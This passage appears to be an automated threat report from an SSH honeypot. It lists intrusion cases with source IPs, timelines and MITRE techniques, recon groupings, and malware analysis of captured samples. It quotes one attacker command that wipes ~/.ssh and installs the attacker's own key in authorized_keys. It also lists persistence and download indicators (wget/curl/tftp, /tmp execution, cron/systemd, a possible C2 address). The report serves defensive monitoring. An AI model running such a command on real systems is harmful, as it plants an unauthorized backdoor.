**Recommended Actions:**
- [ ] Submit `91.186.216[.]80` to AbuseIPDB if not already reported
- [ ] Block `91.186.216[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1912266a07

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-13 01:25 |
| **Last Seen** | 2026-11-13 01:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:25:29` | `cowrie.session.connect` |
| `2026-11-13 01:25:29` | `cowrie.client.version` |
| `2026-11-13 01:25:30` | `cowrie.client.kex` |
| `2026-11-13 01:25:30` | `cowrie.login.success` |
| `2026-11-13 01:25:30` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:25:30` | `cowrie.direct-tcpip.ja4` |
| `2026-11-13 01:25:30` | `cowrie.direct-tcpip.data` |
| `2026-11-13 01:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7695feb3dd1

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-11-13 01:33 |
| **Last Seen** | 2026-11-13 01:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:33:55` | `cowrie.session.connect` |
| `2026-11-13 01:33:55` | `cowrie.client.version` |
| `2026-11-13 01:33:55` | `cowrie.client.kex` |
| `2026-11-13 01:33:56` | `cowrie.login.success` |
| `2026-11-13 01:33:57` | `cowrie.session.params` |
| `2026-11-13 01:33:57` | `cowrie.command.input` |
| `2026-11-13 01:33:57` | `cowrie.command.failed` |
| `2026-11-13 01:33:58` | `cowrie.log.closed` |
| `2026-11-13 01:33:59` | `cowrie.session.params` |
| `2026-11-13 01:33:59` | `cowrie.command.input` |
| `2026-11-13 01:33:59` | `cowrie.session.file_download` |
| `2026-11-13 01:33:59` | `cowrie.log.closed` |
| `2026-11-13 01:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36db528ffd1a

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-11-13 01:33 |
| **Last Seen** | 2026-11-13 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:33:59` | `cowrie.session.connect` |
| `2026-11-13 01:33:59` | `cowrie.client.version` |
| `2026-11-13 01:33:59` | `cowrie.client.kex` |
| `2026-11-13 01:34:00` | `cowrie.login.success` |
| `2026-11-13 01:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0b26bf31b06

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-13 01:34 |
| **Last Seen** | 2026-11-13 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:34:34` | `cowrie.session.connect` |
| `2026-11-13 01:34:34` | `cowrie.client.version` |
| `2026-11-13 01:34:34` | `cowrie.client.kex` |
| `2026-11-13 01:34:35` | `cowrie.login.success` |
| `2026-11-13 01:34:35` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:34:35` | `cowrie.direct-tcpip.data` |
| `2026-11-13 01:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f323157212b4

| Field | Detail |
|---|---|
| **Source IP** | `83.233.100[.]175` |
| **First Seen** | 2026-11-13 01:39 |
| **Last Seen** | 2026-11-13 01:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:39:34` | `cowrie.session.connect` |
| `2026-11-13 01:39:34` | `cowrie.client.version` |
| `2026-11-13 01:39:34` | `cowrie.client.kex` |
| `2026-11-13 01:39:35` | `cowrie.login.success` |
| `2026-11-13 01:39:35` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.100[.]175` to AbuseIPDB if not already reported
- [ ] Block `83.233.100[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a06a53233c86

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-11-13 01:39 |
| **Last Seen** | 2026-11-13 01:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:39:45` | `cowrie.session.connect` |
| `2026-11-13 01:39:46` | `cowrie.client.version` |
| `2026-11-13 01:39:46` | `cowrie.client.kex` |
| `2026-11-13 01:39:47` | `cowrie.login.success` |
| `2026-11-13 01:39:47` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42712bcc9956

| Field | Detail |
|---|---|
| **Source IP** | `103.86.52[.]211` |
| **First Seen** | 2026-11-13 01:43 |
| **Last Seen** | 2026-11-13 01:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:43:24` | `cowrie.session.connect` |
| `2026-11-13 01:43:24` | `cowrie.client.version` |
| `2026-11-13 01:43:24` | `cowrie.client.kex` |
| `2026-11-13 01:43:28` | `cowrie.login.success` |
| `2026-11-13 01:43:29` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.52[.]211` to AbuseIPDB if not already reported
- [ ] Block `103.86.52[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (25) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-cbbcf6daec1a | HIGH | `121.178.185[.]141` | 2026-11-13 01:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dccde3d7d31d | HIGH | `119.246.15[.]94` | 2026-11-13 01:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9f6b79a801f6 | HIGH | `119.246.15[.]94` | 2026-11-13 01:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fc4c297aa30a | HIGH | `92.118.39[.]78` | 2026-11-13 01:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5963a0572cdb | HIGH | `125.19.218[.]50` | 2026-11-13 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5689720ff66e | HIGH | `46.59.91[.]85` | 2026-11-13 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-df7cb7f594be | HIGH | `195.178.110[.]78` | 2026-11-13 02:00 | Y | 0 | 0 | `T1078` |
| IR-d0ef9ffffecf | HIGH | `129.121.138[.]109` | 2026-11-13 02:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-45a8c84d8cb4 | HIGH | `129.121.138[.]109` | 2026-11-13 02:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-704ae1f12081 | HIGH | `176.53.159[.]196` | 2026-11-13 02:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64b39ae3566f | HIGH | `103.107.143[.]82` | 2026-11-13 02:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9614b05a0f3a | HIGH | `136.232.11[.]10` | 2026-11-13 02:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-80ade52f08e6 | HIGH | `103.107.143[.]82` | 2026-11-13 02:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e0dacdc9e85 | HIGH | `78.128.112[.]74` | 2026-11-13 02:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-23f8c7cf7a2b | HIGH | `23.242.245[.]150` | 2026-11-13 02:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c3cef32df335 | HIGH | `182.95.123[.]166` | 2026-11-13 02:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe568e17916b | HIGH | `80.94.95[.]118` | 2026-11-13 02:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe0d086868dd | HIGH | `77.90.185[.]29` | 2026-11-13 02:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cd8ef56296e5 | HIGH | `163.227.22[.]98` | 2026-11-13 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5163cb94b10b | HIGH | `117.158.166[.]73` | 2026-11-13 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f031ae3cbd3f | HIGH | `49.124.153[.]32` | 2026-11-13 02:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9f399d6c8f72 | HIGH | `70.184.75[.]32` | 2026-11-13 02:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65ab84e07b60 | HIGH | `41.219.149[.]78` | 2026-11-13 02:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64df725963a5 | HIGH | `184.183.93[.]106` | 2026-11-13 02:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf8823ac4bd6 | HIGH | `35.210.192[.]98` | 2026-11-13 02:52 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `195.178.110[.]78` | **2** | 2026-11-13 00:08 | 2026-11-13 02:00 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `103.29.70[.]204` | 1 | 2026-11-13 00:44 | 2026-11-13 00:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.84.142[.]100` | 1 | 2026-11-13 01:43 | 2026-11-13 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.172.136[.]20` | 1 | 2026-11-13 02:22 | 2026-11-13 02:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.68.221[.]196` | 1 | 2026-11-13 01:58 | 2026-11-13 01:58 | 19s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-13 00:24 | 2026-11-13 00:25 | 44s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-13 02:34 | 2026-11-13 02:35 | 76s | 0 | `T1592` | 🟢 LOW |
| `159.196.65[.]138` | 1 | 2026-11-13 00:58 | 2026-11-13 00:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-13 00:03 | 2026-11-13 00:04 | 50s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-13 00:56 | 2026-11-13 00:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-11-13 02:19 | 2026-11-13 02:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-11-13 01:08 | 2026-11-13 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.135.63[.]175` | 1 | 2026-11-13 00:05 | 2026-11-13 00:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.15.61[.]102` | 1 | 2026-11-13 02:50 | 2026-11-13 02:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.235.236[.]111` | 1 | 2026-11-13 02:29 | 2026-11-13 02:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.222.59[.]154` | 1 | 2026-11-13 00:04 | 2026-11-13 00:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]177` | 1 | 2026-11-13 01:33 | 2026-11-13 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.199.32[.]174` | 1 | 2026-11-13 01:29 | 2026-11-13 01:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `201.28.237[.]90` | 1 | 2026-11-13 01:18 | 2026-11-13 01:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.201[.]54` | 1 | 2026-11-13 02:02 | 2026-11-13 02:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.152.243[.]192` | 1 | 2026-11-13 01:23 | 2026-11-13 01:24 | 21s | 0 | `T1592` | 🟢 LOW |
| `34.207.149[.]221` | 1 | 2026-11-13 01:27 | 2026-11-13 01:27 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.210.192[.]98` | 1 | 2026-11-13 02:52 | 2026-11-13 02:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | 1 | 2026-11-13 02:47 | 2026-11-13 02:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-13 02:46 | 2026-11-13 02:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.37.13[.]66` | 1 | 2026-11-13 00:07 | 2026-11-13 00:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `61.76.97[.]173` | 1 | 2026-11-13 00:43 | 2026-11-13 00:43 | 16s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-11-13 02:37 | 2026-11-13 02:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-13 01:40 | 2026-11-13 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.122.155[.]60` | 1 | 2026-11-13 00:17 | 2026-11-13 00:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.89.166[.]214` | 1 | 2026-11-13 01:56 | 2026-11-13 01:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-13 02:24 | 2026-11-13 02:24 | 6s | 0 | `T1592` | 🟢 LOW |
| `8.130.98[.]64` | 1 | 2026-11-13 00:53 | 2026-11-13 00:53 | 31s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]56` | 1 | 2026-11-13 00:24 | 2026-11-13 00:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.93.45[.]33` | 1 | 2026-11-13 00:14 | 2026-11-13 00:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.220.230[.]42` | 1 | 2026-11-13 01:37 | 2026-11-13 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]78` | 1 | 2026-11-13 01:51 | 2026-11-13 01:51 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
